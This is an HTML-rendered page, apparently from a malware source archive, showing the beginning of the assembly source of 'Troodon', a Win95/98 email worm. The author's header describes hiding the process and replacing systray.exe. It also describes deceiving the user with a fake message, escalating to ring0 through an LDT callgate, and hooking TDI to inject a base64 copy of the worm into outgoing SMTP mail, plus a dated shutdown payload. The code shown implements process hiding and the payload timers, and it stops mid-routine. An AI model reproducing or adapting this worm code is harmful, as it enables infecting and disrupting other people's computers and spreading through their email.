<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Email-Worm.Win32.Trood.a - troodon.asm.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;   I-Worm.Win9X.Troodon Project</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------</span><span class="sc0">
</span><span class="sc1">;  Technical details:</span><span class="sc0">
</span><span class="sc1">;   This is an Win95/98 specific Internet-Worm, witch spreads trough e-mail.</span><span class="sc0">
</span><span class="sc1">;   When executed it does more things in ring3 and ring0 too.</span><span class="sc0">
</span><span class="sc1">;   - ring3 actions -</span><span class="sc0">
</span><span class="sc1">;       - it looks very similar with a normal Windows application witch has a window etc.</span><span class="sc0">
</span><span class="sc1">;       So it has a window and a message loop. This is needed by the payload witch will activate</span><span class="sc0">
</span><span class="sc1">;       on a specific date (check code). When payload is triggered the foreground window on the desktop</span><span class="sc0">
</span><span class="sc1">;       will start bounce arround on the screen, for 30 seconds then Windows will shutdown.</span><span class="sc0">
</span><span class="sc1">;       This is the payload part, it will activate only if it is running under the name "systray.exe"</span><span class="sc0">
</span><span class="sc1">;       - when starting it checks if already installed in the system: checks if it's name is "systray.exe".</span><span class="sc0">
</span><span class="sc1">;       If not, then it copies itself in System directory under the name "systray.me", by using wininit.ini</span><span class="sc0">
</span><span class="sc1">;       systray.exe will be replaced by systray.me on next startup, and original systray.exe will be saved</span><span class="sc0">
</span><span class="sc1">;       in systray.sys.</span><span class="sc0">
</span><span class="sc1">;       If the name isn't systray.exe then it will show a message to fool the user all is ok.</span><span class="sc0">
</span><span class="sc1">;       If the name is systray.exe then it will run the saved systray.sys using WinExec and it will assume</span><span class="sc0">
</span><span class="sc1">;       that it is already installed in the system.</span><span class="sc0">
</span><span class="sc1">;       - it will encoded current process'es file in base64 and save it in memory allocated with VirtualAlloc</span><span class="sc0">
</span><span class="sc1">;       - it will check for signature in memory at 0xC000E990</span><span class="sc0">
</span><span class="sc1">;       If not in memory then it will jump into ring0 by using a callgate method described by Zombie,</span><span class="sc0">
</span><span class="sc1">;       by patching LDT table.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   - ring0 actions -</span><span class="sc0">
</span><span class="sc1">;       - it allocates memory in ring0 for it's own code and for encoded file.</span><span class="sc0">
</span><span class="sc1">;       - it copies itself and the encoded file in there (after jumping back into ring3 the memory used for</span><span class="sc0">
</span><span class="sc1">;       encoded file will be free.</span><span class="sc0">
</span><span class="sc1">;       - it will hook TdiConnect, TdiSend, TdiCloseConnection, TdiDisconnect for it's own use.</span><span class="sc0">
</span><span class="sc1">;       - it will monitor all outgoing connections checking for SMTP (port 25) connections.</span><span class="sc0">
</span><span class="sc1">;       - when it find one it will wait for DATA command for SMTP server</span><span class="sc0">
</span><span class="sc1">;       - then it will check the content of the e-mail, if it is a MIME formated e-mail containing</span><span class="sc0">
</span><span class="sc1">;       text/plain or text/html or both it will modify the message attaching it's own code (encoded in base64)</span><span class="sc0">
</span><span class="sc1">;       to the mail.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   It has it's own string routines.</span><span class="sc0">
</span><span class="sc1">;   Things I didn't do in this version are: doesn't attach to mails that already have attachements, and to mails</span><span class="sc0">
</span><span class="sc1">;   with no MIME content.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   This is done using NASM syntax.</span><span class="sc0">
</span><span class="sc1">;   Compilation and linking:</span><span class="sc0">
</span><span class="sc1">;       NASMW -f win32 v.asm</span><span class="sc0">
</span><span class="sc1">;       GORC /r vres.rc</span><span class="sc0">
</span><span class="sc1">;       ALINK -entry start -oPE v.obj vres.res kernel32.lib user32.lib gdi32.lib</span><span class="sc0">


</span><span class="sc9">extern</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc0">
</span><span class="sc9">extern</span><span class="sc0"> </span><span class="sc5">RegisterServiceProcess</span><span class="sc0">
</span><span class="sc9">extern</span><span class="sc0"> </span><span class="sc5">GetModuleHandleA</span><span class="sc0">
</span><span class="sc9">extern</span><span class="sc0"> </span><span class="sc5">GetModuleFileNameA</span><span class="sc0">
</span><span class="sc9">extern</span><span class="sc0"> </span><span class="sc5">CopyFileA</span><span class="sc0">
</span><span class="sc9">extern</span><span class="sc0"> </span><span class="sc5">DeleteFileA</span><span class="sc0">
</span><span class="sc9">extern</span><span class="sc0"> </span><span class="sc5">WritePrivateProfileStringA</span><span class="sc0">
</span><span class="sc9">extern</span><span class="sc0"> </span><span class="sc5">WinExec</span><span class="sc0">
</span><span class="sc9">extern</span><span class="sc0"> </span><span class="sc5">VirtualAlloc</span><span class="sc0">
</span><span class="sc9">extern</span><span class="sc0"> </span><span class="sc5">VirtualFree</span><span class="sc0">
</span><span class="sc9">extern</span><span class="sc0"> </span><span class="sc5">CreateFileA</span><span class="sc0">
</span><span class="sc9">extern</span><span class="sc0"> </span><span class="sc5">GetFileSize</span><span class="sc0">
</span><span class="sc9">extern</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc0">
</span><span class="sc9">extern</span><span class="sc0"> </span><span class="sc5">CreateFileMappingA</span><span class="sc0">
</span><span class="sc9">extern</span><span class="sc0"> </span><span class="sc5">MapViewOfFile</span><span class="sc0">
</span><span class="sc9">extern</span><span class="sc0"> </span><span class="sc5">UnmapViewOfFile</span><span class="sc0">
</span><span class="sc9">extern</span><span class="sc0"> </span><span class="sc5">MessageBoxA</span><span class="sc0">
</span><span class="sc9">extern</span><span class="sc0"> </span><span class="sc5">GetForegroundWindow</span><span class="sc0">
</span><span class="sc9">extern</span><span class="sc0"> </span><span class="sc5">GetWindowRect</span><span class="sc0">
</span><span class="sc9">extern</span><span class="sc0"> </span><span class="sc5">MoveWindow</span><span class="sc0">
</span><span class="sc9">extern</span><span class="sc0"> </span><span class="sc5">RegisterClassA</span><span class="sc0">
</span><span class="sc9">extern</span><span class="sc0"> </span><span class="sc5">CreateWindowExA</span><span class="sc0">
</span><span class="sc9">extern</span><span class="sc0"> </span><span class="sc5">ShowWindow</span><span class="sc0">
</span><span class="sc9">extern</span><span class="sc0"> </span><span class="sc5">UpdateWindow</span><span class="sc0">
</span><span class="sc9">extern</span><span class="sc0"> </span><span class="sc5">GetMessageA</span><span class="sc0">
</span><span class="sc9">extern</span><span class="sc0"> </span><span class="sc5">TranslateMessage</span><span class="sc0">
</span><span class="sc9">extern</span><span class="sc0"> </span><span class="sc5">DispatchMessageA</span><span class="sc0">
</span><span class="sc9">extern</span><span class="sc0"> </span><span class="sc5">PostQuitMessage</span><span class="sc0">
</span><span class="sc9">extern</span><span class="sc0"> </span><span class="sc5">DefWindowProcA</span><span class="sc0">
</span><span class="sc9">extern</span><span class="sc0"> </span><span class="sc5">SetTimer</span><span class="sc0">
</span><span class="sc9">extern</span><span class="sc0"> </span><span class="sc5">GetLocalTime</span><span class="sc0">
</span><span class="sc9">extern</span><span class="sc0"> </span><span class="sc5">ExitWindowsEx</span><span class="sc0">
</span><span class="sc9">extern</span><span class="sc0"> </span><span class="sc5">GetSystemDirectoryA</span><span class="sc0">
</span><span class="sc9">extern</span><span class="sc0"> </span><span class="sc5">lstrcatA</span><span class="sc0">

</span><span class="sc9">%include</span><span class="sc0"> </span><span class="sc3">"win32n.inc"</span><span class="sc0">
</span><span class="sc9">%include</span><span class="sc0"> </span><span class="sc3">"vxdn.inc"</span><span class="sc0">

</span><span class="sc5">@@VTDI_Get_Version</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">004880000h</span><span class="sc0">
</span><span class="sc5">@@VTDI_Get_Info</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">004880008h</span><span class="sc0">
</span><span class="sc5">ID_TIMER1</span><span class="sc0">               </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">100</span><span class="sc0">
</span><span class="sc5">ID_TIMER2</span><span class="sc0">               </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">101</span><span class="sc0">
</span><span class="sc5">step</span><span class="sc0">                    </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">2</span><span class="sc0">

</span><span class="sc9">global</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">

</span><span class="sc4">[</span><span class="sc9">bits</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc4">[</span><span class="sc9">section</span><span class="sc0"> </span><span class="sc10">.text</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc9">%define</span><span class="sc0"> </span><span class="sc5">ebp_hInstance</span><span class="sc0">       </span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc0">   </span><span class="sc1">; handle of current instance</span><span class="sc0">
</span><span class="sc9">%define</span><span class="sc0"> </span><span class="sc5">ebp_hPrevInstance</span><span class="sc0">   </span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">0ch</span><span class="sc0"> </span><span class="sc1">; handle of previous instance</span><span class="sc0">
</span><span class="sc9">%define</span><span class="sc0"> </span><span class="sc5">ebp_lpszCmdLine</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc0"> </span><span class="sc1">; pointer to command line</span><span class="sc0">
</span><span class="sc9">%define</span><span class="sc0"> </span><span class="sc5">ebp_nCmdShow</span><span class="sc0">        </span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc0"> </span><span class="sc1">; show state of window</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">

        </span><span class="sc1">;  hide the process even if it stay just a bit in memory,</span><span class="sc0">
        </span><span class="sc1">;  just to be sure that no quick eye see it</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RegisterServiceProcess</span><span class="sc0">

        </span><span class="sc1">; get module handle</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetModuleHandleA</span><span class="sc0">

        </span><span class="sc1">; get module file name</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">path_len</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc5">my_path</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetModuleFileNameA</span><span class="sc0">

        </span><span class="sc1">; make paths; %SYSDIR% + filenames</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">make_paths</span><span class="sc0">

        </span><span class="sc1">; Register Window Class</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp_hInstance</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WindowClassStruc</span><span class="sc4">+</span><span class="sc5">WNDCLASS.hInstance</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WindowClassStruc</span><span class="sc4">+</span><span class="sc5">WNDCLASS.hIcon</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WindowClassStruc</span><span class="sc4">+</span><span class="sc5">WNDCLASS.hCursor</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc5">WindowClassStruc</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RegisterClassA</span><span class="sc0">

        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">.Success</span><span class="sc0">

</span><span class="sc5">.Fail</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">FareWell</span><span class="sc0">

</span><span class="sc5">.Success</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">MakeWindow</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc1">; create the window</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp_hInstance</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc2">200</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc2">200</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc5">WS_OVERLAPPEDWINDOW</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc5">WindowTitle</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc5">ClassName</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc5">WS_EX_OVERLAPPEDWINDOW</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CreateWindowExA</span><span class="sc0">

        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">.Success</span><span class="sc0">

</span><span class="sc5">.Fail</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">FareWell</span><span class="sc0">

</span><span class="sc5">.Success</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WindowHandle</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc5">SW_HIDE</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WindowHandle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ShowWindow</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">UpdateWindow</span><span class="sc0">
    
</span><span class="sc5">MsgLoop</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc1">; the message loop</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc5">WindowMSG</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetMessageA</span><span class="sc0">

        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">FareWell</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc5">WindowMSG</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">TranslateMessage</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc5">WindowMSG</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DispatchMessageA</span><span class="sc0">
    
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">MsgLoop</span><span class="sc0">

</span><span class="sc5">FareWell</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ExitProcess</span><span class="sc0">
        
</span><span class="sc5">WndProc</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc9">%define</span><span class="sc0"> </span><span class="sc5">ebp_hWnd</span><span class="sc0">   </span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc0">        </span><span class="sc1">; handle of window</span><span class="sc0">
</span><span class="sc9">%define</span><span class="sc0"> </span><span class="sc5">ebp_Msg</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">0ch</span><span class="sc0">      </span><span class="sc1">; message</span><span class="sc0">
</span><span class="sc9">%define</span><span class="sc0"> </span><span class="sc5">ebp_wParam</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc0">      </span><span class="sc1">; first message parameter</span><span class="sc0">
</span><span class="sc9">%define</span><span class="sc0"> </span><span class="sc5">ebp_lParam</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc0">      </span><span class="sc1">; second message parameter</span><span class="sc0">
</span><span class="sc9">%define</span><span class="sc0"> </span><span class="sc5">ebp_DC</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp_Msg</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">WM_CREATE</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">Create_Handler</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp_Msg</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">WM_TIMER</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">.next_2</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Timer_Handle</span><span class="sc0">
</span><span class="sc5">.next_2</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp_Msg</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">WM_DESTROY</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">.next_1</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Destroy_Handler</span><span class="sc0">
</span><span class="sc5">.next_1</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">.DefMsgHandler</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp_lParam</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp_wParam</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp_Msg</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp_hWnd</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DefWindowProcA</span><span class="sc0">

</span><span class="sc9">.Exit</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0"> </span><span class="sc2">0x0C</span><span class="sc0">

</span><span class="sc5">Create_Handler</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc1">; check if the name of the file is "systray.exe"</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">check_systray</span><span class="sc0">

        </span><span class="sc1">; THIS is the call the installs the i-worm "engine" in memory</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">iworm</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc5">STime</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetLocalTime</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">systray_ornot</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">     </span><span class="sc1">; "myself" is systray.exe</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">.next_1</span><span class="sc0">

        </span><span class="sc1">; Get out</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ExitProcess</span><span class="sc0">

</span><span class="sc5">.next_1</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc1">; next is for payload</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">STime</span><span class="sc4">+</span><span class="sc5">SYSTEMTIME.wDayOfWeek</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc9">.exit</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc5">ID_TIMER1</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp_hWnd</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SetTimer</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc2">300000</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc5">ID_TIMER2</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp_hWnd</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SetTimer</span><span class="sc0">

</span><span class="sc9">.exit</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">WndProc.Exit</span><span class="sc0">

</span><span class="sc5">Timer_Handle</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc1">; this is for payload again</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp_wParam</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">ID_TIMER1</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">.next_1</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">.timer_1</span><span class="sc0">
</span><span class="sc5">.next_1</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp_wParam</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">ID_TIMER2</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">.next_2</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">.timer_2</span><span class="sc0">
</span><span class="sc5">.next_2</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">WndProc.Exit</span><span class="sc0">

</span><span class="sc5">.timer_1</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc1">; get forground window</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetForegroundWindow</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hWnd</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">; "Restore" window</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc5">SW_RESTORE</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ShowWindow</span><span class="sc0">

        </span><span class="sc1">; get window position and size</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc5">rect</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hWnd</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetWindowRect</span><span class="sc0">

        </span><span class="sc1">; move it</span><span class="sc0">
